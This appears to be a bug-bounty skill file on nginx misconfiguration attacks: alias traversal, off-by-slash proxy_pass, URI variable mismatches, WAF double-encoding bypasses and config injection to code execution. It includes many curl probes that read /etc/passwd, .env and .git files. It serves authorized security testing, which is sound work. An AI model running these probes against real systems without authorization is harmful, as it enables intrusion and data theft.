---
name: nginx
description: nginx attack surface: alias traversal, off-by-slash, $uri/$request_uri mismatch, merge_slashes bypass, parser differentials, config injection, proxy_pass path injection
depends_on: []
---

# Nginx

Nginx is the dominant reverse proxy/web server. Bug bounty value concentrates in misconfiguration classes ($50K corpus max): alias traversal, off-by-slash proxy_pass, variable decoding mismatches, and parser differentials between nginx and backend servers. Public nginx configs (Ansible, Terraform, docs) are free audit targets.

## Alias Traversal

The classic nginx misconfiguration. When a `location` block without a trailing slash pairs with an `alias` directive:

```nginx
# VULNERABLE: location without trailing slash + alias
location /static {
    alias /var/www/assets/;
}
# Request: /static../etc/passwd → resolves to /var/www/assets/../etc/passwd → /var/www/etc/passwd
# Request: /static..%2fetc%2fpasswd → may also work depending on normalization
```

```bash
# Test alias traversal
curl -s "https://target.com/static../etc/passwd"
curl -s "https://target.com/static..%2fetc%2fpasswd"
curl -s "https://target.com/static..%252fetc%252fpasswd"  # double-encoded
```

The fix is matching trailing slashes: `location /static/` + `alias /var/www/assets/`. The vulnerability exists because nginx concatenates the URI portion after the location match with the alias path.

## Off-by-Slash on proxy_pass

When `proxy_pass` includes a trailing URI component, nginx strips the matched location prefix and appends the remainder. A missing or extra slash creates path injection:

```nginx
# VULNERABLE: location /app but proxy_pass to backend without matching path
location /app {
    proxy_pass http://backend:8080/;
}
# Request: /app/../admin → proxy_pass sends /../admin to backend
# Request: /app%2f..%2fadmin → URL-decoded traversal

# VULNERABLE: off-by-slash allows prefix escape
location /api/ {
    proxy_pass http://backend:8080/v1;
}
# Request: /api/../../etc → backend receives /v../../etc (path join without slash)
```

```bash
# Test off-by-slash
curl -s "https://target.com/api/../admin"
curl -s "https://target.com/api/..%2fadmin"
curl -s "https://target.com/api%2f..%2f..%2fadmin"
```

## $uri vs $request_uri Mismatch

`$uri` is the decoded, normalized URI. `$request_uri` is the raw, original request URI. Using one for a security check and the other for proxying creates bypass opportunities:

```nginx
# VULNERABLE: security check uses $uri (decoded), proxy uses $request_uri (raw)
if ($uri ~ ^/admin) {
    return 403;
}
proxy_pass http://backend$request_uri;

# Bypass: request /admin%2fpanel
# $uri = /admin/panel → matches deny rule
# But: request /%61dmin/panel
# $uri = /admin/panel (decoded) → matches
# However: request /./admin/panel
# Some configs miss normalization edge cases
```

Key differentials to test:
- `%2f` (encoded slash) -- `$uri` decodes it, `$request_uri` preserves it
- `%2F` vs `%2f` (case sensitivity in encoding)
- `//` (double slash) -- `$uri` may collapse, `$request_uri` preserves
- `/.` and `/..` sequences -- normalization differences

## merge_slashes Bypass

When `merge_slashes off` is set (or the backend doesn't merge), path-based authorization can be bypassed:

```bash
# If authz checks /admin but merge_slashes is off:
curl -s "https://target.com/admin//api"       # double slash
curl -s "https://target.com//admin/api"       # leading double slash
curl -s "https://target.com/admin/./api"      # dot segment
curl -s "https://target.com/admin%2fapi"      # encoded slash
curl -s "https://target.com/Admin/api"        # case variation (if backend is case-insensitive)
```

## Parser Differential Hunting

Whenever two layers parse the same URL/path/header, look for parser differentials. This applies to:
- nginx + external auth service (subrequest auth)
- nginx + backend application
- CDN + nginx origin
- nginx + WAF

```
# PATH_INFO extension bypass: for URL-based extension filters
/admin/api/anything.css        # nginx serves as static, but backend routes to /admin/api
/admin/api%00.js               # null byte injection in older versions
/admin/api;.js                 # semicolon path parameter (Tomcat backend)
```

Test each normalization edge case through both parser layers independently, then together.

## Two-Stage Config Injection

When a target sanitizes inline injection but the config language supports file inclusion, chain file-write with file-include:

1. Find a file-write primitive (e.g., `log_format` directive controlling where nginx writes)
2. Write attacker-controlled content to a predictable path
3. Find a file-include primitive (`include` directive, Lua `dofile()`)
4. Include the written file to achieve code execution

This pattern applies to any system where nginx config is generated from user input (ingress controllers, reverse proxy managers, multi-tenant hosting platforms).

## Public Config Audit

Any project that publishes its nginx config (via Ansible, Terraform, documentation, or Docker images) is a free audit target:

```bash
# Grep published configs for dangerous patterns
grep -rn "alias " nginx.conf          # alias without matching trailing slash
grep -rn "proxy_pass.*[^/]$" nginx.conf  # proxy_pass without trailing slash
grep -rn '$uri' nginx.conf             # $uri in security-relevant context
grep -rn "merge_slashes off" nginx.conf
grep -rn "internal;" nginx.conf        # internal locations sometimes reachable
grep -rn "add_header.*\*" nginx.conf   # CORS wildcards
```

Also check for:
- `.htaccess` / `web.config` / `nginx.conf` / `Procfile` in exposed paths -- reveal handlers, rewrites, proxy targets
- Dockerfile/docker-compose with nginx config baked in (inspect image layers)
- Terraform/Ansible repos with nginx templates

## Exposed Sensitive Paths

When nginx serves static files, test for version control and config leaks:

```bash
# VCS and config exposure
curl -s "https://target.com/.git/HEAD"
curl -s "https://target.com/.svn/entries"
curl -s "https://target.com/package.json"
curl -s "https://target.com/Dockerfile"
curl -s "https://target.com/.env"
curl -s "https://target.com/nginx.conf"
curl -s "https://target.com/server-status"   # if mod_status is proxied
```

These indicate nginx `location` blocks are too broad or lack explicit deny rules for sensitive paths.

## Probe Targets

```bash
# Alias traversal
curl -s "https://target.com/proxypath../etc/passwd"
curl -s "https://target.com/proxypath..%2fetc%2fpasswd"

# Normalization bypass
curl -s "https://target.com/admin//"
curl -s "https://target.com/admin%2f"
curl -s "https://target.com/admin%252f"
curl -s "https://target.com/%61dmin/"

# Off-by-slash proxy_pass
curl -s "https://target.com/api/../internal"
curl -s "https://target.com/api/..%2finternal"

# Variable mismatch
curl -s "https://target.com/restricted%2fpath"

# Version fingerprinting
curl -sI "https://target.com/" | grep -i "Server:"

# PATH_INFO extension bypass
curl -s "https://target.com/api/endpoint.css"
curl -s "https://target.com/api/endpoint;.js"
```

## Defense-Bypass Pairs

| Defense | Bypass | Evidence |
|---------|--------|----------|
| `location /admin { deny all; }` | `/admin/../admin/` or `/Admin/` on case-insensitive backend | Parser differential |
| Alias with trailing slash on location | Remove trailing slash from request: `/static` vs `/static/` | Alias traversal variant |
| WAF blocking `../` | Double-encode: `%252e%252e%252f` | WAF decodes once, nginx decodes again |
| `$uri` deny rule | Encoded characters in `$request_uri` bypass decoded `$uri` check | Variable mismatch |
| `merge_slashes on` (default) | Backend that preserves double slashes interprets differently | Proxy → backend differential |
| Annotation sanitizer on ingress controller | Use unsanitized sibling annotation | Ingress-nginx CVE pattern ($2.5K x4) |
| `internal;` location directive | Abuse `X-Accel-Redirect` header from backend response | Backend controls internal routing |

## CVE Mapping

When nginx version is disclosed (`Server: nginx/X.Y.Z`), map to known CVEs. Nginx versions are slow to update in production. Key CVE classes:
- HTTP/2 vulnerabilities (memory corruption, request smuggling)
- Range filter heap overflow (CVE-2017-7529)
- DNS resolver vulnerabilities
- URI processing bugs affecting alias/proxy_pass

## Cross-References

`path_traversal_lfi_rfi`, `http_request_smuggling`, `waf_bypass`, `cache_poisoning`, `ssrf`

## Validation Requirements

- Reproduce findings with at least one alternate principal where authz is involved
- Verify version disclosure aligns with the CVE list before claiming version-specific impact
- Distinguish "tech detected" from "tech vulnerable" -- many fingerprints just identify the stack
- For alias traversal: show file contents read from outside the intended directory
- For proxy_pass bypass: show backend response to the injected path
- For parser differentials: demonstrate the two layers interpreting the same request differently
